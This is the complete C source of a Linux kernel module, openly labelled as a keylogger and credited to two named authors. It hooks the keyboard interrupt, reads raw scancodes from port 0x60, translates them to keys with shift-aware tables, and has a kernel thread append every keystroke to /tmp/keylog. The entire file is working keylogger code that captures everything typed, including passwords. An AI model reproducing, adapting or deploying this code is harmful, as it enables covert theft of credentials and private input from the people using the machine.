#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/kthread.h>
#include <linux/wait.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>

/* Defining definitions to make life easier */
#define KB_IRQ 1
#define LOG_FILE "/tmp/keylog"
#define BUFFER_SIZE 1024

/* Meta Information */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kacper Powolny & Adam Wiktor");
MODULE_DESCRIPTION("It was a little easier...");

/* Table of static variables */
static struct task_struct *logger_thread;
static struct file *log_fp;
static char *key_buffer;
static int buffer_pos = 0;
static int shift_pressed = 0;
static wait_queue_head_t wq;
static int data_ready = 0;
static const char *keymap[2][128] = {
    { /* Without SHIFT */
        "", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
        "BACK", "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]",
        "ENTER", "CTRL", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'",
        "`", "SHIFT", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
        "SHIFT", "*", "ALT", " ", "CAPS", "F1", "F2", "F3", "F4", "F5", "F6",
        "F7", "F8", "F9", "F10", "NUM", "SCROLL", "7", "8", "9", "-", "4", "5",
        "6", "+", "1", "2", "3", "0", ".", "UNKNOWN"
    },
    { /* With SHIFT */
        "", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
        "BACK", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}",
        "ENTER", "CTRL", "A", "S", "D", "F", "G", "H", "J", "K", "L", ":", "\"",
        "~", "SHIFT", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?",
        "SHIFT", "*", "ALT", " ", "CAPS", "F1", "F2", "F3", "F4", "F5", "F6",
        "F7", "F8", "F9", "F10", "NUM", "SCROLL", "7", "8", "9", "-", "4", "5",
        "6", "+", "1", "2", "3", "0", ".", "UNKNOWN"
    }
};

/* Opening log file */
static struct file* log_open(const char *path) {
    struct file *fp = filp_open(path, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(fp)) {
        printk(KERN_ERR "Failed to open log file.\n");
        return NULL;
    }
    return fp;
}

/* Kernel thread for writing logs to the the log file  */
static int logger_fn(void *data) {
    while (!kthread_should_stop()) {
        wait_event_interruptible(wq, data_ready || kthread_should_stop());
        if (kthread_should_stop()) break;

        /* Write the buffered keys to log file */
        if (log_fp && buffer_pos > 0) {
            kernel_write(log_fp, key_buffer, buffer_pos, &log_fp->f_pos);
            buffer_pos = 0;
        }

        data_ready = 0;
    }

    return 0;
}

/* Function to handle key presses and log them into the file  */
static void log_key(unsigned char scancode) {
    const char *key;

    if (scancode == 42 || scancode == 54) { // SHIFT pressed
        shift_pressed = 1;
        return;
    } else if (scancode == 170 || scancode == 182) { // SHIFT released
        shift_pressed = 0;
        return;
    }

    if (scancode < 128) {
        key = keymap[shift_pressed][scancode];
        if (key && key[0] != '\0') { // Ensure the key is valid - not empty
            int len = strlen(key); // Get the length of the key string

	    /* Adding more space for new key  */
            if (buffer_pos + len + 1 < BUFFER_SIZE) {
                memcpy(key_buffer + buffer_pos, key, len); // Copy the key to the buffer
                buffer_pos += len;
                key_buffer[buffer_pos++] = ' '; // Add space after key
                key_buffer[buffer_pos] = '\0'; // Terminating the buffer

                data_ready = 1; // Set flag indicating data is ready to be written
                wake_up_interruptible(&wq); // Wake up the logging thread
            }
        }
    }
}

/* IRQ Keyboard handler */
static irqreturn_t kb_irq_handler(int irq, void *dev_id) {
    unsigned char scancode = inb(0x60);  // Read scancode 
    log_key(scancode); // Log the key
    return IRQ_HANDLED;
}

/* Module initialization */
static int __init keylogger_init(void) {
    int ret;

    /* Allocate memory for the keylog buffer  */
    key_buffer = kzalloc(BUFFER_SIZE, GFP_KERNEL);
    if (!key_buffer) { // Checking if memory allocating is working
        printk(KERN_ERR "Failed to allocate key buffer.\n");
        return -ENOMEM;
    }

    /* Open log file */
    log_fp = log_open(LOG_FILE);
    if (!log_fp) { // Checking if the log file could not be opened
        kfree(key_buffer); // Free allocated memory
        return -EIO;
    }

    /* Register the IRQ handler for the keyboard */
    ret = request_irq(KB_IRQ, kb_irq_handler, IRQF_SHARED, "keylogger", (void *)kb_irq_handler);
    if (ret) {
        printk(KERN_ERR "Failed to register keyboard IRQ.\n");
        filp_close(log_fp, NULL); // Close the log file
        kfree(key_buffer); // Free the buffer
        return ret;
    }

    /* Start logger thread */
    init_waitqueue_head(&wq); // Initialize wait queue
    logger_thread = kthread_run(logger_fn, NULL, "keylogger_thread"); // Run the logging thread
    if (IS_ERR(logger_thread)) { // Check if the thread could not be started
        printk(KERN_ERR "Failed to start logger thread.\n");
        free_irq(KB_IRQ, (void *)kb_irq_handler); // Free IRQ
        filp_close(log_fp, NULL); // Close log file
        kfree(key_buffer); // Free buffer memory
        return PTR_ERR(logger_thread); // Return error code from the thread
    }

    printk(KERN_INFO "Keylogger initialized.\n");
    return 0; // Return success
}

/* Module cleanup */
static void __exit keylogger_exit(void) {
    kthread_stop(logger_thread);
    free_irq(KB_IRQ, (void *)kb_irq_handler);
    if (log_fp) {
        filp_close(log_fp, NULL);
    }
    kfree(key_buffer);
    printk(KERN_INFO "Keylogger stopped.\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);


